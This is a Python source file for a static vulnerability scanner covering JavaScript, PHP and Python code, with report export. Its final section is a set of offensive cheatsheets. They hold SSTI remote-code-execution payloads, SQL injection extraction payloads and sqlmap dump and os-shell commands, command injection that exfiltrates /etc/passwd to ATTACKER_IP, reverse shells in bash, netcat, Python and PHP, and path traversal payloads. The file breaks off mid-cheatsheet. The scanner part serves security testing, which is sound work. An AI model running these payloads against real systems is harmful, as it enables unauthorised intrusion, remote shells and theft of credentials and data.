#!/usr/bin/env python3
"""
Multi-Language Security Scanner
Static analysis tool for JS/TS/PHP/Python vulnerability detection.
"""

import argparse
import json
import os
import re
import sys
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Set
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

from rules import SECURITY_RULES, SecurityRule, Severity, TOTAL_RULES, RULE_CATEGORIES
from rules_php import PHP_SECURITY_RULES, PHP_TOTAL_RULES, PHP_RULE_CATEGORIES
from rules_python import PYTHON_SECURITY_RULES, PYTHON_TOTAL_RULES, PYTHON_RULE_CATEGORIES
from unminify import unminify_string

# Combine all rules
ALL_RULES = SECURITY_RULES + PHP_SECURITY_RULES + PYTHON_SECURITY_RULES
ALL_TOTAL_RULES = TOTAL_RULES + PHP_TOTAL_RULES + PYTHON_TOTAL_RULES
ALL_CATEGORIES = list(set(RULE_CATEGORIES + PHP_RULE_CATEGORIES + PYTHON_RULE_CATEGORIES))


# ANSI color codes for terminal output
class Colors:
    CRITICAL = "\033[91m\033[1m"  # Bold Red
    HIGH = "\033[91m"              # Red
    MEDIUM = "\033[93m"            # Yellow
    LOW = "\033[94m"               # Blue
    INFO = "\033[96m"              # Cyan
    SUCCESS = "\033[92m"           # Green
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"
    UNDERLINE = "\033[4m"


SEVERITY_COLORS = {
    Severity.CRITICAL: Colors.CRITICAL,
    Severity.HIGH: Colors.HIGH,
    Severity.MEDIUM: Colors.MEDIUM,
    Severity.LOW: Colors.LOW,
    Severity.INFO: Colors.INFO,
}


@dataclass
class Finding:
    """Represents a security finding."""
    rule_id: str
    rule_name: str
    severity: str
    category: str
    cwe_id: str
    file_path: str
    line_number: int
    line_content: str
    context_before: List[str] = field(default_factory=list)
    context_after: List[str] = field(default_factory=list)
    description: str = ""
    exploitation: str = ""
    remediation: str = ""
    match_highlight: str = ""


@dataclass
class ScanResult:
    """Complete scan result."""
    scan_time: str
    target_path: str
    files_scanned: int
    total_findings: int
    findings_by_severity: Dict[str, int]
    findings_by_category: Dict[str, int]
    findings: List[Finding]
    scan_duration_seconds: float


class SecurityScanner:
    """Main security scanner class."""

    SUPPORTED_EXTENSIONS = {'.js', '.ts', '.tsx', '.jsx', '.mjs', '.cjs', '.php', '.phtml', '.php3', '.php4', '.php5', '.php7', '.phps', '.inc', '.py', '.pyw'}
    
    JS_EXTENSIONS = {'.js', '.ts', '.tsx', '.jsx', '.mjs', '.cjs'}
    PHP_EXTENSIONS = {'.php', '.phtml', '.php3', '.php4', '.php5', '.php7', '.phps', '.inc'}
    PYTHON_EXTENSIONS = {'.py', '.pyw'}

    def __init__(self, target_path: str, config: Optional[Dict] = None):
        self.target_path = Path(target_path).resolve()
        self.config = config or {}
        self.findings: List[Finding] = []
        self.files_scanned = 0
        self.compiled_rules_js: List[tuple] = []
        self.compiled_rules_php: List[tuple] = []
        self.compiled_rules_python: List[tuple] = []
        self.unminify = self.config.get('unminify', False)
        self._compile_rules()

    def _compile_rules(self):
        """Pre-compile all regex patterns for performance."""
        excluded_rules = set(self.config.get('exclude_rules', []))
        min_severity = self.config.get('min_severity', 'INFO')
        severity_order = ['INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
        min_severity_idx = severity_order.index(min_severity)

        # Compile JavaScript/TypeScript rules
        for rule in SECURITY_RULES:
            if rule.id in excluded_rules:
                continue
            if severity_order.index(rule.severity.value) < min_severity_idx:
                continue
            try:
                compiled = re.compile(rule.pattern, re.IGNORECASE | re.MULTILINE)
                self.compiled_rules_js.append((compiled, rule))
            except re.error as e:
                print(f"{Colors.MEDIUM}Warning: Invalid regex in rule {rule.id}: {e}{Colors.RESET}")
        
        # Compile PHP rules
        for rule in PHP_SECURITY_RULES:
            if rule.id in excluded_rules:
                continue
            if severity_order.index(rule.severity.value) < min_severity_idx:
                continue
            try:
                compiled = re.compile(rule.pattern, re.IGNORECASE | re.MULTILINE)
                self.compiled_rules_php.append((compiled, rule))
            except re.error as e:
                print(f"{Colors.MEDIUM}Warning: Invalid regex in rule {rule.id}: {e}{Colors.RESET}")
        
        # Compile Python rules
        for rule in PYTHON_SECURITY_RULES:
            if rule.id in excluded_rules:
                continue
            if severity_order.index(rule.severity.value) < min_severity_idx:
                continue
            try:
                compiled = re.compile(rule.pattern, re.IGNORECASE | re.MULTILINE)
                self.compiled_rules_python.append((compiled, rule))
            except re.error as e:
                print(f"{Colors.MEDIUM}Warning: Invalid regex in rule {rule.id}: {e}{Colors.RESET}")

    def _should_scan_file(self, file_path: Path) -> bool:
        """Check if file should be scanned based on extension and exclusions."""
        if file_path.suffix.lower() not in self.SUPPORTED_EXTENSIONS:
            return False
        
        # Skip common non-source directories (unless include_vendor is enabled)
        include_vendor = self.config.get('include_vendor', False)
        skip_dirs = {'node_modules', '.git', 'dist', 'build', '.next', 'coverage', 
                     '__pycache__', '.cache', 'bower_components'}
        if not include_vendor:
            skip_dirs.add('vendor')
        if any(part in skip_dirs for part in file_path.parts):
            return False
        
        # Skip minified files
        if '.min.' in file_path.name:
            return False
        
        return True

    def _get_context_lines(self, lines: List[str], line_idx: int, context_size: int = 2) -> tuple:
        """Get context lines before and after the finding."""
        start = max(0, line_idx - context_size)
        end = min(len(lines), line_idx + context_size + 1)
        before = lines[start:line_idx]
        after = lines[line_idx + 1:end]
        return before, after

    def _is_false_positive(self, rule: SecurityRule, line: str, file_path: str) -> bool:
        """Check for common false positive patterns."""
        lower_line = line.lower()
        
        # Check rule-specific false positive hints
        if rule.false_positive_hints:
            for hint in rule.false_positive_hints:
                if hint.lower() in lower_line:
                    return True
        
        # Common false positive patterns
        false_positive_patterns = [
            r'^\s*//.*',           # Single-line comments
            r'^\s*/\*.*\*/',       # Single-line block comments
            r'^\s*\*\s*',          # Multi-line comment continuation
            r'test[s]?/',          # Test files
            r'\.test\.',           # Test files
            r'\.spec\.',           # Spec files
            r'mock',               # Mock files
            r'example',            # Example code
            r'sample',             # Sample code
        ]
        
        for pattern in false_positive_patterns:
            if re.search(pattern, lower_line) or re.search(pattern, file_path.lower()):
                # Don't filter if it's a critical finding
                if rule.severity in [Severity.CRITICAL, Severity.HIGH]:
                    return False
                # Still report but could be marked as potential FP
                pass
        
        return False

    def _is_minified(self, content: str) -> bool:
        """Heuristic to detect if code is minified."""
        lines = content.split('\n')
        if len(lines) == 0:
            return False
        
        # Check average line length - minified code has very long lines
        total_len = sum(len(line) for line in lines)
        avg_len = total_len / len(lines) if lines else 0
        
        # Check for lack of indentation
        indented_lines = sum(1 for line in lines if line.startswith('  ') or line.startswith('\t'))
        indent_ratio = indented_lines / len(lines) if lines else 0
        
        # Minified if: avg line > 200 chars OR (avg line > 100 and < 5% indented)
        return avg_len > 200 or (avg_len > 100 and indent_ratio < 0.05)

    def scan_file(self, file_path: Path) -> List[Finding]:
        """Scan a single file for vulnerabilities."""
        findings = []
        
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            
            # Auto-unminify if enabled and file appears minified (JS only)
            file_ext = file_path.suffix.lower()
            is_js = file_ext in self.JS_EXTENSIONS
            is_php = file_ext in self.PHP_EXTENSIONS
            is_python = file_ext in self.PYTHON_EXTENSIONS
            
            if is_js and self.unminify and self._is_minified(content):
                try:
                    content = unminify_string(content)
                except Exception:
                    pass  # If unminify fails, scan original content
            
            lines = content.split('\n')
        except Exception as e:
            print(f"{Colors.DIM}  Skipping {file_path}: {e}{Colors.RESET}")
            return findings

        # Select appropriate rules based on file type
        if is_php:
            compiled_rules = self.compiled_rules_php
        elif is_python:
            compiled_rules = self.compiled_rules_python
        else:
            compiled_rules = self.compiled_rules_js

        for compiled_pattern, rule in compiled_rules:
            for match in compiled_pattern.finditer(content):
                # Calculate line number
                line_start = content.count('\n', 0, match.start())
                line_content = lines[line_start] if line_start < len(lines) else ""
                
                # Skip potential false positives
                if self._is_false_positive(rule, line_content, str(file_path)):
                    continue
                
                # Get context
                context_before, context_after = self._get_context_lines(lines, line_start)
                
                finding = Finding(
                    rule_id=rule.id,
                    rule_name=rule.name,
                    severity=rule.severity.value,
                    category=rule.category,
                    cwe_id=rule.cwe_id,
                    file_path=str(file_path),
                    line_number=line_start + 1,
                    line_content=line_content.strip(),
                    context_before=[l.strip() for l in context_before],
                    context_after=[l.strip() for l in context_after],
                    description=rule.description,
                    exploitation=rule.exploitation,
                    remediation=rule.remediation,
                    match_highlight=match.group(0)[:100]  # Limit match length
                )
                findings.append(finding)
        
        return findings

    def scan(self, max_workers: int = 4) -> ScanResult:
        """Recursively scan target path for vulnerabilities."""
        start_time = datetime.now()
        files_to_scan: List[Path] = []
        
        # Collect files to scan
        if self.target_path.is_file():
            if self._should_scan_file(self.target_path):
                files_to_scan.append(self.target_path)
        else:
            for file_path in self.target_path.rglob('*'):
                if file_path.is_file() and self._should_scan_file(file_path):
                    files_to_scan.append(file_path)
        
        print(f"\n{Colors.BOLD}🔍 Scanning {len(files_to_scan)} files...{Colors.RESET}\n")
        
        # Scan files in parallel
        all_findings: List[Finding] = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_file = {executor.submit(self.scan_file, f): f for f in files_to_scan}
            for future in as_completed(future_to_file):
                file_findings = future.result()
                if file_findings:
                    all_findings.extend(file_findings)
                self.files_scanned += 1
        
        # Sort findings by severity (critical first)
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
        all_findings.sort(key=lambda f: (severity_order.get(f.severity, 5), f.file_path))
        
        # Calculate statistics
        findings_by_severity = defaultdict(int)
        findings_by_category = defaultdict(int)
        for finding in all_findings:
            findings_by_severity[finding.severity] += 1
            findings_by_category[finding.category] += 1
        
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        
        return ScanResult(
            scan_time=start_time.isoformat(),
            target_path=str(self.target_path),
            files_scanned=self.files_scanned,
            total_findings=len(all_findings),
            findings_by_severity=dict(findings_by_severity),
            findings_by_category=dict(findings_by_category),
            findings=all_findings,
            scan_duration_seconds=duration
        )


class ReportGenerator:
    """Generate reports from scan results."""

    @staticmethod
    def print_summary(result: ScanResult, color: bool = True):
        """Print a summary of the scan results."""
        c = Colors if color else type('', (), {k: '' for k in dir(Colors)})()
        
        print(f"\n{'═' * 70}")
        print(f"{c.BOLD}📊 SCAN SUMMARY{c.RESET}")
        print(f"{'═' * 70}\n")
        
        print(f"  Target:         {result.target_path}")
        print(f"  Files Scanned:  {result.files_scanned}")
        print(f"  Duration:       {result.scan_duration_seconds:.2f} seconds")
        print(f"  Rules Loaded:   {ALL_TOTAL_RULES} rules across {len(ALL_CATEGORIES)} categories")
        print(f"  Total Findings: {result.total_findings}")
        
        if result.findings_by_severity:
            print(f"\n  {c.BOLD}Findings by Severity:{c.RESET}")
            for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
                count = result.findings_by_severity.get(sev, 0)
                if count > 0:
                    sev_color = SEVERITY_COLORS.get(Severity[sev], '') if color else ''
                    print(f"    {sev_color}● {sev}: {count}{c.RESET}")
        
        if result.findings_by_category:
            print(f"\n  {c.BOLD}Findings by Category:{c.RESET}")
            for cat, count in sorted(result.findings_by_category.items(), key=lambda x: -x[1]):
                print(f"    • {cat}: {count}")
        
        print()

    @staticmethod
    def print_findings(result: ScanResult, verbose: bool = False, color: bool = True, 
                       show_exploitation: bool = True):
        """Print detailed findings."""
        c = Colors if color else type('', (), {k: '' for k in dir(Colors)})()
        
        if not result.findings:
            print(f"\n{c.SUCCESS}✅ No vulnerabilities found!{c.RESET}\n")
            return
        
        print(f"\n{'═' * 70}")
        print(f"{c.BOLD}🚨 VULNERABILITY FINDINGS{c.RESET}")
        print(f"{'═' * 70}\n")
        
        for i, finding in enumerate(result.findings, 1):
            sev_color = SEVERITY_COLORS.get(Severity[finding.severity], '') if color else ''
            
            print(f"{c.BOLD}[{i}] {finding.rule_name}{c.RESET}")
            print(f"    {sev_color}Severity: {finding.severity}{c.RESET} | "
                  f"Category: {finding.category} | {finding.cwe_id}")
            print(f"    📁 {finding.file_path}:{finding.line_number}")
            print()
            
            # Show code context
            print(f"    {c.DIM}Code Context:{c.RESET}")
            for ctx_line in finding.context_before:
                print(f"    {c.DIM}  {ctx_line}{c.RESET}")
            print(f"    {sev_color}➤ {finding.line_content}{c.RESET}")
            for ctx_line in finding.context_after:
                print(f"    {c.DIM}  {ctx_line}{c.RESET}")
            print()
            
            # Description
            print(f"    {c.BOLD}Description:{c.RESET}")
            print(f"    {finding.description}")
            print()
            
            # Exploitation guidance
            if show_exploitation and finding.exploitation:
                print(f"    {c.CRITICAL}⚔️  EXPLOITATION GUIDANCE:{c.RESET}")
                for line in finding.exploitation.strip().split('\n'):
                    print(f"    {line}")
                print()
            
            # Remediation
            if verbose:
                print(f"    {c.SUCCESS}🛡️  Remediation:{c.RESET}")
                print(f"    {finding.remediation}")
                print()
            
            print(f"{'─' * 70}\n")

    @staticmethod
    def export_json(result: ScanResult, output_path: str):
        """Export results to JSON file."""
        # Convert findings to dicts
        output = {
            'scan_time': result.scan_time,
            'target_path': result.target_path,
            'files_scanned': result.files_scanned,
            'total_findings': result.total_findings,
            'findings_by_severity': result.findings_by_severity,
            'findings_by_category': result.findings_by_category,
            'scan_duration_seconds': result.scan_duration_seconds,
            'findings': [asdict(f) for f in result.findings]
        }
        
        with open(output_path, 'w') as f:
            json.dump(output, f, indent=2)
        
        print(f"✅ Results exported to: {output_path}")

    @staticmethod
    def export_html(result: ScanResult, output_path: str):
        """Export results to interactive HTML report."""
        html_template = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Scan Report</title>
    <style>
        :root {
            --critical: #dc2626;
            --high: #ea580c;
            --medium: #ca8a04;
            --low: #2563eb;
            --info: #0891b2;
            --bg: #0f172a;
            --card: #1e293b;
            --text: #e2e8f0;
            --border: #334155;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'SF Mono', 'Fira Code', monospace;
            background: var(--bg);
            color: var(--text);
            line-height: 1.6;
            padding: 2rem;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        header {
            text-align: center;
            padding: 2rem 0;
            border-bottom: 1px solid var(--border);
            margin-bottom: 2rem;
        }
        h1 { font-size: 2rem; margin-bottom: 0.5rem; }
        .subtitle { color: #94a3b8; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }
        .stat-card {
            background: var(--card);
            padding: 1.5rem;
            border-radius: 8px;
            border: 1px solid var(--border);
        }
        .stat-card h3 { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.5rem; }
        .stat-card .value { font-size: 2rem; font-weight: bold; }
        .severity-badges { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 1rem; }
        .badge {
            padding: 0.25rem 0.75rem;
            border-radius: 9999px;
            font-size: 0.75rem;
            font-weight: bold;
        }
        .badge.critical { background: var(--critical); }
        .badge.high { background: var(--high); }
        .badge.medium { background: var(--medium); color: #000; }
        .badge.low { background: var(--low); }
        .badge.info { background: var(--info); }
        .findings { display: flex; flex-direction: column; gap: 1rem; }
        .finding {
            background: var(--card);
            border-radius: 8px;
            border: 1px solid var(--border);
            overflow: hidden;
        }
        .finding-header {
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            cursor: pointer;
            border-left: 4px solid;
        }
        .finding-header.critical { border-color: var(--critical); }
        .finding-header.high { border-color: var(--high); }
        .finding-header.medium { border-color: var(--medium); }
        .finding-header.low { border-color: var(--low); }
        .finding-header.info { border-color: var(--info); }
        .finding-title { font-weight: bold; margin-bottom: 0.25rem; }
        .finding-meta { font-size: 0.875rem; color: #94a3b8; }
        .finding-body { 
            padding: 1rem;
            border-top: 1px solid var(--border);
            display: none;
        }
        .finding.expanded .finding-body { display: block; }
        .code-block {
            background: #0d1117;
            padding: 1rem;
            border-radius: 4px;
            overflow-x: auto;
            margin: 1rem 0;
            font-size: 0.875rem;
        }
        .code-block .highlight { 
            background: rgba(234, 88, 12, 0.3);
            display: block;
        }
        .section { margin: 1rem 0; }
        .section h4 { 
            color: #94a3b8;
            font-size: 0.75rem;
            text-transform: uppercase;
            margin-bottom: 0.5rem;
        }
        .exploitation {
            background: rgba(220, 38, 38, 0.1);
            border: 1px solid var(--critical);
            border-radius: 4px;
            padding: 1rem;
            white-space: pre-wrap;
            font-size: 0.875rem;
        }
        .remediation {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid #22c55e;
            border-radius: 4px;
            padding: 1rem;
        }
        .filter-bar {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }
        .filter-btn {
            padding: 0.5rem 1rem;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 4px;
            color: var(--text);
            cursor: pointer;
            font-family: inherit;
        }
        .filter-btn.active { background: #3b82f6; border-color: #3b82f6; }
        .filter-btn:hover { border-color: #3b82f6; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔒 Security Scan Report</h1>
            <p class="subtitle">Generated: ''' + result.scan_time + '''</p>
        </header>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Files Scanned</h3>
                <div class="value">''' + str(result.files_scanned) + '''</div>
            </div>
            <div class="stat-card">
                <h3>Total Findings</h3>
                <div class="value">''' + str(result.total_findings) + '''</div>
            </div>
            <div class="stat-card">
                <h3>Scan Duration</h3>
                <div class="value">''' + f"{result.scan_duration_seconds:.2f}s" + '''</div>
            </div>
            <div class="stat-card">
                <h3>Severity Breakdown</h3>
                <div class="severity-badges">
                    ''' + ''.join([f'<span class="badge {sev.lower()}">{sev}: {count}</span>' 
                                   for sev, count in result.findings_by_severity.items()]) + '''
                </div>
            </div>
        </div>

        <div class="filter-bar">
            <button class="filter-btn active" data-filter="all">All</button>
            <button class="filter-btn" data-filter="critical">Critical</button>
            <button class="filter-btn" data-filter="high">High</button>
            <button class="filter-btn" data-filter="medium">Medium</button>
            <button class="filter-btn" data-filter="low">Low</button>
            <button class="filter-btn" data-filter="info">Info</button>
        </div>

        <div class="findings">
''' + '\n'.join([f'''
            <div class="finding" data-severity="{f.severity.lower()}">
                <div class="finding-header {f.severity.lower()}" onclick="this.parentElement.classList.toggle('expanded')">
                    <div>
                        <div class="finding-title">[{f.rule_id}] {f.rule_name}</div>
                        <div class="finding-meta">
                            📁 {f.file_path}:{f.line_number} | {f.category} | {f.cwe_id}
                        </div>
                    </div>
                    <span class="badge {f.severity.lower()}">{f.severity}</span>
                </div>
                <div class="finding-body">
                    <div class="section">
                        <h4>Code Context</h4>
                        <div class="code-block">
{''.join([f"<span>{line}</span><br>" for line in f.context_before])}
<span class="highlight">➤ {f.line_content}</span>
{''.join([f"<span>{line}</span><br>" for line in f.context_after])}
                        </div>
                    </div>
                    <div class="section">
                        <h4>Description</h4>
                        <p>{f.description}</p>
                    </div>
                    <div class="section">
                        <h4>⚔️ Exploitation</h4>
                        <div class="exploitation">{f.exploitation}</div>
                    </div>
                    <div class="section">
                        <h4>🛡️ Remediation</h4>
                        <div class="remediation">{f.remediation}</div>
                    </div>
                </div>
            </div>
''' for f in result.findings]) + '''
        </div>
    </div>
    <script>
        document.querySelectorAll('.filter-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                const filter = btn.dataset.filter;
                document.querySelectorAll('.finding').forEach(finding => {
                    if (filter === 'all' || finding.dataset.severity === filter) {
                        finding.style.display = 'block';
                    } else {
                        finding.style.display = 'none';
                    }
                });
            });
        });
    </script>
</body>
</html>'''
        
        with open(output_path, 'w') as f:
            f.write(html_template)
        
        print(f"✅ HTML report exported to: {output_path}")
    
    @staticmethod
    def export_csv(result: ScanResult, output_path: str):
        """Export results to CSV file."""
        import csv
        
        with open(output_path, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'Severity', 'Rule ID', 'Rule Name', 'Category', 'CWE',
                'File', 'Line', 'Code', 'Description'
            ])
            
            for finding in result.findings:
                writer.writerow([
                    finding.severity,
                    finding.rule_id,
                    finding.rule_name,
                    finding.category,
                    finding.cwe_id,
                    finding.file_path,
                    finding.line_number,
                    finding.line_content[:200],
                    finding.description
                ])
        
        print(f"✅ CSV report exported to: {output_path}")
    
    def print_brief(self, result: ScanResult, color: bool = True):
        """Print brief output - just file:line:severity:rule."""
        if not color:
            for finding in result.findings:
                print(f"{finding.file_path}:{finding.line_number}:{finding.severity}:{finding.rule_name}")
        else:
            for finding in result.findings:
                sev = Severity(finding.severity)
                sev_color = SEVERITY_COLORS.get(sev, '')
                print(f"{finding.file_path}:{finding.line_number}:{sev_color}{finding.severity}{Colors.RESET}:{finding.rule_name}")


def grep_files(target_path: str, pattern: str, extensions: set, include_vendor: bool = False):
    """Search for custom regex pattern in files."""
    import re
    
    target = Path(target_path).resolve()
    skip_dirs = {'node_modules', '.git', 'dist', 'build', '.next', 'coverage', 
                 '__pycache__', '.cache', 'bower_components'}
    if not include_vendor:
        skip_dirs.add('vendor')
    
    try:
        compiled = re.compile(pattern, re.IGNORECASE | re.MULTILINE)
    except re.error as e:
        print(f"{Colors.CRITICAL}Invalid regex pattern: {e}{Colors.RESET}")
        return
    
    print(f"\n{Colors.BOLD}Searching for pattern: {Colors.RESET}{pattern}\n")
    
    match_count = 0
    file_count = 0
    
    files = [target] if target.is_file() else target.rglob('*')
    
    for file_path in files:
        if file_path.is_dir():
            continue
        if file_path.suffix.lower() not in extensions:
            continue
        if any(part in skip_dirs for part in file_path.parts):
            continue
        
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            
            file_has_match = False
            for i, line in enumerate(lines, 1):
                if compiled.search(line):
                    if not file_has_match:
                        print(f"{Colors.BOLD}{file_path}{Colors.RESET}")
                        file_has_match = True
                        file_count += 1
                    
                    print(f"  {Colors.DIM}{i:4}:{Colors.RESET} {line.strip()[:150]}")
                    match_count += 1
            
            if file_has_match:
                print()
                
        except Exception:
            pass
    
    print(f"{Colors.DIM}Found {match_count} matches in {file_count} files{Colors.RESET}\n")


CHEATSHEETS = {
    'ssti': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  SERVER-SIDE TEMPLATE INJECTION (SSTI) CHEATSHEET                            ║
╚══════════════════════════════════════════════════════════════════════════════╝

DETECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{{7*7}}              → 49 (most engines)
{{7*'7'}}            → 7777777 (Jinja2) or 49 (Twig)
${7*7}               → 49 (Freemarker, Velocity)
<%= 7*7 %>           → 49 (ERB)
#{7*7}               → 49 (Ruby slim)

JINJA2 (Flask/Python):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# File read
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Config/secrets
{{config.items()}}
{{config.SECRET_KEY}}

TWIG (PHP):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Twig 1.x RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 2.x/3.x RCE
{{['id']|filter('system')}}
{{'id'|filter('passthru')}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}

FREEMARKER (Java):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
""",

    'sqli': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  SQL INJECTION CHEATSHEET                                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

DETECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'                    (single quote - check for errors)
''                   (escaped single quote)
' OR '1'='1          (always true)
' AND '1'='2         (always false - compare behavior)
' OR SLEEP(5)--      (time-based blind)

UNION ATTACKS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--       (increment until error)

# Union select
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT 1,2,3--

# Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,null FROM information_schema.tables--
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--

MySQL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
' UNION SELECT @@version,null--
' UNION SELECT user(),null--
' UNION SELECT schema_name,null FROM information_schema.schemata--
' UNION SELECT LOAD_FILE('/etc/passwd'),null--

PostgreSQL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
' UNION SELECT version(),null--
' UNION SELECT current_user,null--
'; CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM 'id';--

SQLite:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
' UNION SELECT sql,null FROM sqlite_master--
' UNION SELECT name,null FROM sqlite_master WHERE type='table'--

SQLMAP:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sqlmap -u "http://target.com/?id=1" --dbs
sqlmap -u "http://target.com/?id=1" -D dbname --tables
sqlmap -u "http://target.com/?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/?id=1" --os-shell
""",

    'cmdi': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  COMMAND INJECTION CHEATSHEET                                                ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid

BLIND DETECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1 &
`sleep 5`

OUT-OF-BAND:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
; curl http://ATTACKER_IP/$(whoami)
; wget http://ATTACKER_IP/?$(cat /etc/passwd | base64)
; nslookup $(whoami).ATTACKER_DOMAIN

REVERSE SHELLS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Bash
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Netcat
; nc -e /bin/sh ATTACKER_IP 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Python
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

BYPASS FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'cat\\x20/etc/passwd'&&$X

# Quote bypass
c''at /etc/passwd
c""at /etc/passwd
""",

    'lfi': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  LOCAL FILE INCLUSION (LFI) CHEATSHEET                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd    (double encoding)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

INTERESTING FILES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
